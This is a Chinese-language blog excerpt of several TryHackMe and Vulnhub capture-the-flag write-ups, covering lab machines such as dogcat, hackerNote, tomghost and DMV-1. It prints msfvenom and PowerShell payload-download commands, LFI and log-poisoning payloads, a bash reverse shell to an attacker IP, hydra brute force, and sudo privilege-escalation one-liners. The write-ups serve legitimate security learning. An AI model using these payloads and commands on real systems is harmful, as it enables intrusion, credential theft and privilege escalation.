<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>为了方便提权，我们可以转移到msf上面去执行。生成一个payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -a x86 --encoder x86&#x2F;shikata_ga_nai LHOST&#x3D;[Your-ip] LPORT&#x3D;[Your-port] -f exe -o chickme.exe</span><br></pre></td></tr></table></figure>

<p>使用这个命令下载msf生成的反向payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;ip:port&#x2F;chickme.exe&#39;,&#39;shell.exe&#39;)&quot;</span><br></pre></td></tr></table></figure>



<p>不过先不急着连接msf生成的payload，先查看当前用户的权限<br><img src="https://images.atsud0.me/images/post/Screenshot_20200521_203401.jpg" alt="priv"></p>
<p>连接msf生成的payload。打开msf，执行以下命令，监听端口。这里设置的ip和port要和前面用msfvenom生成的payload一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set LHOST your-ip </span><br><span class="line">set LPORT listening-port </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200521_203300.jpg" alt="run"></p>
<p>使用这条命令执行exe程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-process shell.exe</span><br></pre></td></tr></table></figure>

<p>转移<code>shell</code>之后，我们已经知道当前用户的权限中，是有以下的权限是开启的。</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>简要</th>
<th>状态</th>
</tr>
</thead>
<tbody><tr>
<td>SeDebugPrivilege</td>
<td>Debug programs</td>
<td>Enabled</td>
</tr>
<tr>
<td>SeChangeNotifyPrivilege</td>
<td>Bypass traverse checking</td>
<td>Enabled</td>
</tr>
<tr>
<td>SeImpersonatePrivilege</td>
<td>Impersonate a client after authentication</td>
<td>Enabled</td>
</tr>
<tr>
<td>SeCreateGlobalPrivilege</td>
<td>Create global objects</td>
<td>Enabled</td>
</tr>
</tbody></table>
<p>所以可以尝试使用获取token的方式来提权。先在msf的shell中导入我们需要的模块，列出token，导入token，转移进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -g</span><br><span class="line">impersonate_token &quot;BUILTIN\Administrators&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200521_204235.jpg" alt="token"></p>
<a href="https://www.exploit-db.com/papers/42556" title="" target="">Abusing Token Privileges For LPE</a>

<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" title="" target="">access-tokens</a>

]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>PowerShell</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-dogcat</title>
    <url>/2020/06/07/TryHackMe-dogcat/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/dogcat" title="" target="">在线靶机链接:dogcat</a>

<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开放服务探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_145515.jpg" alt="nmap"></p>
<p>网站路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_145636.jpg" alt="dir"></p>
<p>网站首页<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_145701.jpg" alt=""></p>
<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>通过随意点击页面的dog和cat按钮，可以猜测到是本地文件包含。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_145809.jpg" alt=""></p>
<p>尝试使用/etc/passwd来测试，但是请求被拒绝了。<br><img src="images/post/Screenshot_20200607_145919.jpg" alt=""></p>
<p>通过右键查看源代码，已经包含图片的页面，可以发现是有一个./cats目录的，所以可以通过这个路径来绕过。<br>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view&#x3D;.&#x2F;cats&#x2F;..&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>但是构造了这个payload之后，还是不成功，因为它会自动帮你添加一个php的后缀。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_150820.jpg" alt=""></p>
<p>如果我们只是要查看php文件的话，那就无所谓，但是我们不仅要查看php文件，还要看其他的系统文件。先使用以下payload来看网站源代码是如何自动加后缀的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;dogs&#x2F;..&#x2F;index</span><br></pre></td></tr></table></figure>
<p>base64解码之后得到以下代码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_154123.jpg" alt=""></p>
<p>可以看到如果传入了ext参数，他就不会自己去添加php的后缀了。所以我们可以手动的去传入一个ext参数。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>解决了后缀的问题后，因为是文件包含，所以可以尝试apache日志注入导致命令执行来获得shell，构造以下payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?view&#x3D;.&#x2F;cats&#x2F;..&#x2F;..&#x2F;..&#x2F;log&#x2F;apache2&#x2F;access.log&amp;ext</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200607_155605.jpg" alt=""></p>
<p>可以看到我已经正确的执行了whoami的命令了。所以我们可以直接通过生成一句话来获得web-shell。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_160914.jpg" alt=""></p>
<p>发送请求之后，访问生成的文件。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_160938.jpg" alt=""><br>不是返回404就是成功了。</p>
<p>直接蚁剑连接成功<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_161742.jpg" alt=""></p>
<p>第一个flag:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">***&#123;****_**_***_*_******_********&#125;</span><br></pre></td></tr></table></figure>

<p>第二个flag:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">***&#123;***_**_***_******&#125;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>因为在蚁剑的终端上，我不能正常的反弹shell，所以我创建了一个shell.sh文件，里面是反弹shell的命令。获得反弹回来的shell之后，查看能执行的sudo程序是什么。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_162208.jpg" alt=""></p>
<p>恩，是env。那我们可以直接运行以下命令来获得shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo env sh</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200607_162302.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag3:***&#123;*********_************_******&#125;</span><br></pre></td></tr></table></figure>
<p>拿到flag3之后，在拿flag4的路上我卡了很久。因为目录拿到的root权限只是在docker镜像中，我们并没有获得目标服务器真正的root权限。最后在/opt/backups下找到一个<code>backup.sh</code>这个文件的内容平平无其，只是打包网站根目录而已。但是解压出来之后文件是dockfile什么的通过搜索，得知docker有一个定时执行任务的机制叫做<code>DockerContainer</code><a href="https://www.jianshu.com/p/351a2b2b416b" title="" target="">Docker Container中启动定时任务范例</a>。抱着尝试的心态，往<code>backup.sh</code>中写入反弹shell的命令，开启监听后，过了一会就获得了真正的root权限了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_163632.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag4:***&#123;***********_**_***********_**_***********_********************************&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>加深了对本地文件包含的印象。发现自己对docker没什么了解，以后考虑要好好学习一波。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>GTFOBins-env</tag>
        <tag>LFI</tag>
        <tag>DockerContainer</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-hackerNote</title>
    <url>/2020/05/20/TryHackMe-hackerNote/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/hackernote" title="" target="">靶机链接:HackNote</a>

<p>靶机难度：初学者到中等</p>
<a id="more"></a>


<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描端口后发现目标机器开起来三个端口<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_220338.jpg" alt="nmap"></p>
<ul>
<li>22 </li>
<li>80</li>
<li>8080</li>
</ul>
<p>我们也可以看到namp的脚本检测到了是网站后端是用go语言去编写的。</p>
<p>用<code>gobuster</code>探测路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_220737.jpg" alt="gobuster"></p>
<p>看起来好像是没有什么隐藏路径的。</p>
<p>看起来是个很随便的网站。。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_221120.jpg" alt="index"></p>
<p>我们随便注册一个用户，去看看网站有什么功能<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_221054.jpg" alt="log"></p>
<p>像是一个记事本的网站。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_221244.jpg" alt="note"></p>
<p>退出登录返回到登录界面，输入个不存在的用户名看看回显。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_221416.jpg" alt=""></p>
<h2 id="定时攻击"><a href="#定时攻击" class="headerlink" title="定时攻击"></a>定时攻击</h2><p>如果你观察的够仔细的话，你会发现存在的用户名和不存在的用户名发出错误密码的提示时间不同。所以考虑使用定时攻击。</p>
<p>直接使用房間创建者制作好的<a href="https://github.com/NinjaJc01/hackerNoteExploits" title="" target="">hackerNoteExploits</a>。</p>
<p>下载好<code>exploit</code>后修改<code>exploits.py</code>修改下<code>host</code>地址和字典位置(j_names.txt。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200520_131812.jpg" alt="run"></p>
<p>跑出用户名，因为网站上面有忘记密码提示。所以使用这个用户名去看看密码提示。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_132039.jpg" alt="asd"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;combinator.bin colors.txt numbers.txt &gt; wordlist.txt</span><br></pre></td></tr></table></figure>
<p>使用数字和颜色生成密码字典攻击。</p>
<p>使用<code>hydra</code>爆破密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l james -P wordlist.txt 10.10.55.157 -s 80 http-post-form &quot;&#x2F;api&#x2F;user&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Invalid Username Or Password&quot; -t 64</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200520_132954.jpg" alt="passwd"></p>
<p>登录进去，发现ssh密码。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_133145-1.jpg" alt="ssh"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功之后，尝试使用sudo查看权限的时候。我发现这是不是和<code>CVE-2019-18634</code>有点像啊。看看往期文章<a href="/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" title="Linux提权方式">Linux提权方式</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_133425.jpg" alt="a"></p>
<p>gcc编译好利用程序后，用scp的方式传到目标机器上。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_134250.jpg" alt="zxc"></p>
<p>现在我们已经获得root权限了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>复习了</p>
<ul>
<li>CVE-2019-18634</li>
</ul>
<p>了解了</p>
<ul>
<li>定时攻击</li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>sudo</tag>
        <tag>CVE-2019-18634</tag>
        <tag>timing attack</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-tomghost</title>
    <url>/2020/05/04/TryHackMe-tomghost/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/tomghost" target="_blank" rel="noopener">tonghost</a></p>
<p>靶机难度:简单</p>
<a id="more"></a>

<p>nmap扫描之后会发现目标主机只打开了tomcat端口,尝试能不能使用弱密码登录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200504_200103.jpg" alt="nmap"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200504_200513.jpg" alt="fail"><br>宣告失败desu.</p>
<p>看能不能找到这个版本的tomcat的漏洞,看我们找到了什么<br><img src="https://www.cnblogs.com/tr1ple/p/12346535.html" alt="CVE-2020-1938"><br>搜索这个cve漏洞, 会发现这是一个影响了tomcat6-9.0.31以下版本的漏洞/<br>只要发现了目标机器开启了有8009和8080端口的话就可以使用poc攻击这个漏洞<br><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">poc地址</a></p>
<p>使用poc尝试去读取文件验证<br><img src="https://images.atsud0.me/images/post/Screenshot_20200504_213752.jpg" alt="did"></p>
<p>成功,而且我们也得到了一个用户的帐号密码.</p>
<p>使用这个帐号ssh登录上去.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200504_214141.jpg" alt="user"></p>
<p>没有<code>user.txt</code>,但是有其他两个文件,这两个文件应该是存储了另外一个用户的密码,查看这两个文件会发现应该是gpg加密的公钥和私钥匙对吧</p>
<p>把这两个文件用scp的方式下载下来,使用<code>gpg2john</code>解密出哈希值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg2john ~&#x2F;tryhackme.asc &gt; tryhackme.hash</span><br></pre></td></tr></table></figure>
<p>解密成哈希之后,就轮到开膛手登场.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john tryhackme.hash --wordlist&#x3D;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>不一会密码就跑出来了,但是这个还是不是最终的密码,先使用<code>gpg</code>导入钥匙环,<br><code>gpg --import tryhackme.asc</code></p>
<p>再使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg --decrypt credential.pgp</span><br></pre></td></tr></table></figure>
<p>最后merlin真正的密码就出来了</p>
<p>使用这个密码切换到<code>merlin</code>用户<br><img src="https://images.atsud0.me/images/post/Screenshot_20200504_214801.jpg" alt="usertxt"></p>
<p>得到user的flag了,同时我也查询了一下sudo权限,发现允许以root身份使用<code>/usr/bin/zip</code>的命令</p>
<p>好玩的来了,因为我前几天刚好遇到过这个zip提权,但是没有提权成功.<a href="/2020/05/05/TryHackMe-Library/" title="没有成功的例子">没有成功的例子</a>,其实zip也是可以被用来提权的,因为zip有个参数允许运行任意命令.</p>
<p>得到flag.txt<br><img src="https://images.atsud0.me/images/post/Screenshot_20200504_215011.jpg" alt="zip"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>john</tag>
        <tag>tomcat</tag>
        <tag>CVE-2020-1938</tag>
        <tag>GTFOBins-zip</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-yearoftherabbit</title>
    <url>/2020/07/02/TryHackMe-yearoftherabbit/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/yearoftherabbit" target="_blank" rel="noopener">靶机实验</a></p>
<a id="more"></a>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -T5 -p- 10.10.239.235 -sC -sV </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-01 10:34 UTC</span><br><span class="line">Nmap scan report for ip-10-10-239-235.eu-west-1.compute.internal (10.10.239.235)</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)</span><br><span class="line">|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)</span><br><span class="line">|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)</span><br><span class="line">|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">MAC Address: 02:A7:C9:CC:F6:0C (Unknown)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>dirb扫不出什么东西,但是在assets/style.css 下发现点奇怪的东西<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_131841.jpg" alt=""></p>
<p>如果直接访问找到的页面,会直接跳转到youtube的一个视频下.抓包后发现隐藏目录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132230.jpg" alt=""></p>
<p>最后会发现是张图片<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132440.jpg" alt=""></p>
<p>用zsteg读取隐藏的数据后<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132532.jpg" alt=""></p>
<p>会给出ftp的用户名和密码</p>
<p>连接上去后会发现里面只有一个名为Eli’s_creds.txt的文件 看名字都知道是什么东西了.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132643.jpg" alt=""></p>
<p>这是段brainfuck加密后的内容,解密后出来就是eli用户的密码.</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ssh连接该用户后,会出现一段提示<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132848.jpg" alt=""></p>
<p>搜索该名字后会发现该目录存在/usr/games/处<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_132944.jpg" alt=""></p>
<p>该目录下面有一个隐藏的文件,存放的就是gwendline用户的密码.切换到gwendoline用户后sudo -l 会发现<br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_133120.jpg" alt=""></p>
<p>又因为sudo版本小于1.8.28版本,并且拥有sudo vi的权限,那么接下来就很简单了</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u#-1 &#x2F;usr&#x2F;bin&#x2F;vi &#x2F;home&#x2F;gwendoline&#x2F;user.txt</span><br><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200702_133429.jpg" alt=""></p>
<p>提权成功.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>难度不大,主要是要细心,枚举是关键!</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>CVE-2019-14287</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Dmv-1</title>
    <url>/2020/06/14/Vulnhub-Dmv/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这个靶机是在vulnhub找到的，不过你也可以在Tryhackme的在线连接中使用。</p>
<ul>
<li><a href="https://tryhackme.com/room/convertmyvideo" title="" target="">在线链接：convertmyvideo</a></li>
<li><a href="https://www.vulnhub.com/entry/dmv-1,462/" title="" target="">下载链接：DMV-1</a>

</li>
</ul>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_122229.jpg" alt=""></p>
<p>路径扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_122720.jpg" alt=""></p>
<p>访问url后，发现似乎是个可以输入youtube视频的id转换为mp3的网站，admin路径要求帐号密码，所以暂时行不通。随便输入一个字符串作为视频id，捕获下请求，看下错误状态<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_123405.jpg" alt=""><br>根据错误信息，谷歌后发现这是用了一个程序。<a href="https://github.com/ytdl-org/youtube-dl" title="" target="">youtubedl</a>，看了下修复记录，好像没什么可以利用的。再看看这个程序的帮助指令。结果看到了这个东西。。似乎还能执行命令。所以姑且猜测是错误利用?</p>
<h2 id="脆弱利用"><a href="#脆弱利用" class="headerlink" title="脆弱利用"></a>脆弱利用</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200614_123806.jpg" alt=""><br>但是如果你直接这样去输入命令执行是不成功的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_124044.jpg" alt=""><br>因为是linux系统，所以可以直接试试<code>id</code>，这样虽然是成功了，但是输出的信息不够全<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_124535.jpg" alt=""><br>因为懒，所以直接用burpsuite的爆破模块去测试特殊字符。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_124941.jpg" alt=""><br>最后发现<code>&lt;</code>这个符号很特殊,只有他输出的是没有找到该文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_125009.jpg" alt=""><br>返回重放模块，尝试下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#96;id&#96;</span><br></pre></td></tr></table></figure>
<p>然后我就执行不成功了，，可能是之前写了个<code>&lt;id</code>。然后我这里换成了ls就执行成功了。（可能是id被当成了一个文件生成了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_130424.jpg" alt=""><br>现在可以执行命令了，但是空格还是被过滤了，空格被过滤就代表有很多命令不能使用了。所以得找个办法绕过空格的方式。经过谷歌后，找到了bash中的一个变量<code>${IFS}</code>是可以用来代替空格的。<a href="https://www.cnblogs.com/cocowool/archive/2013/01/15/2861904.html" title="" target="">shell:处理文件中的空格</a><br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_130641.jpg" alt=""><br>现在就简单了，目标站点是用php环境的，空格过滤也被绕过了。那么直接wget一个句话就好了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_131007.jpg" alt=""></p>
<p>访问下我们的一句话，看看是否成功。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_131039.jpg" alt=""><br><code>phpinfo</code>信息已经被打印出来了，直接蚁剑连上去就好了。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连上去后访问admin目录，找到flag<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_131446.jpg" alt=""><br>访问<code>.htpasswd</code>文件获得的密码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_131616.jpg" alt=""><br>$apr是md5的apache加密，hashcat模式为1600，直接放在hashcat跑一下就出来了，是个弱密码。（不过跑出来了好像也没什么作用。。。<br>/tmp目录下是一个clean.sh，看起来是删除下载目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf downloads</span><br></pre></td></tr></table></figure>
<p>不过这个downloads目录在哪呢。。看起来不在dmv用户目录下(find也找不到，说明这个目录在www用户权限之外)，随便一提在这里我已经用我能用的手段了，都没有找到能提权的方法。（也许这就是菜吧<br>询问大佬后，他们建议我使用pspy来监控正在运行的程序，所以之后我发现了一个东西<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_133914.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_134012.jpg" alt=""><br>UID=33是www-data用户，但是UID=0是谁就不用我多说了吧。看起来root用户会定时每分钟去执行/var/www/html/tmp/clean.sh这个脚本，那我们是不是可以修改这个脚本文件，来获得root的shell呢。<br>将以下代码写入<code>clean.sh</code></p>
<figure class="highlight shell"><figcaption><span>clean.sh</span></figcaption><table><tr><td class="code"><pre><span class="line">bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.1/8888 0&gt;&amp;1'</span><br></pre></td></tr></table></figure>
<p>开启监听8888端口。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_134509.jpg" alt=""><br>ok!看起来我们已经成功拿到shell了。我原以为downloads会在root的家目录下，不过当我拿到shell之后，发现并不是这样的。我看crontab下也没有定时执行的工作。不明白是在哪里运行的。如果你知道，烦请您能告诉我。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当进入一台机器后，也要看下目标机器运行的任务，最好能用像pspy这样的程序来监控。<br>url应用程序中的测试，要学会使用fuzz测试，不要傻傻的自己手测，多浪费时间啊。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>pspy</tag>
        <tag>youtubedl</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Kioptrix-1</title>
    <url>/2020/06/15/Vulnhub-Kioptrix-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是群里大佬推荐我做的靶机之一。</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" title="" target="">下载链接:kioptrix-level-1</a>

</li>
</ul>
<p>这个靶机的作者说有多种方式可以拿到shell。</p>
<a id="more"></a>

<p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_085626.jpg" alt=""><br>路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_124148.jpg" alt=""></p>
<h2 id="方法一-使用到了msf辅助模块，不推荐"><a href="#方法一-使用到了msf辅助模块，不推荐" class="headerlink" title="方法一(使用到了msf辅助模块，不推荐)"></a>方法一(使用到了msf辅助模块，不推荐)</h2><p>探测smb版本（就是这里用到了msf。。应该有其他方式也可以探测的。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_123637.jpg" alt=""></p>
<blockquote>
<p>之后看了其他大佬的wirteup，我发现执行<code>smbclient -L 192.168.40.156</code>也会显示samba的版本信息的，但是在我这里却提示连接超时。。</p>
</blockquote>
<p>发现是samba 2.2.1a，搜索exploit看看有没有可利用的程序。<a href="https://www.exploit-db.com/exploits/10" title="" target="">Samba &lt; 2.2.8 (Linux&#x2F;BSD) - Remote Code Execution</a></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_123758.jpg" alt=""></p>
<p>将现成的exploit编译好并执行，就已经是root用户了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_123925.jpg" alt=""></p>
<p>这个方式，没有任何难度。唯一缺点在于会使用到msf。要尽量避免自己用到msf才行。因为oscp只有一次使用msf的机会，机会宝贵，不能随便乱用。</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用目标服务器的<code>openssl0.9.6b</code>的漏洞。漏洞编号为<a href="https://nvd.nist.gov/vuln/detail/CVE-2002-0656" title="" target="">CVE-2002-0656</a>，<a href="https://www.exploit-db.com/exploits/40347" title="" target="">exp-db</a><br>下载好后是有多个文件的，如果编译报以下错误<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_193003.jpg" alt=""><br>将以下代码添加到exp代码的<code>ssl2.h</code>头文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;openssl&#x2F;rc4.h&gt;</span><br><span class="line">#include &lt;openssl&#x2F;md5.h&gt;</span><br></pre></td></tr></table></figure>
<p>之后就编译通过了(在我虚拟机上成功了Centos7 内核3.10)，之后执行编译出来的二进制文件就能获得apache用户的权限了。</p>
<p>获得apache用户的权限后，看了一圈suid和家用户，crontab好像都没有可以利用的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_194551.jpg" alt=""></p>
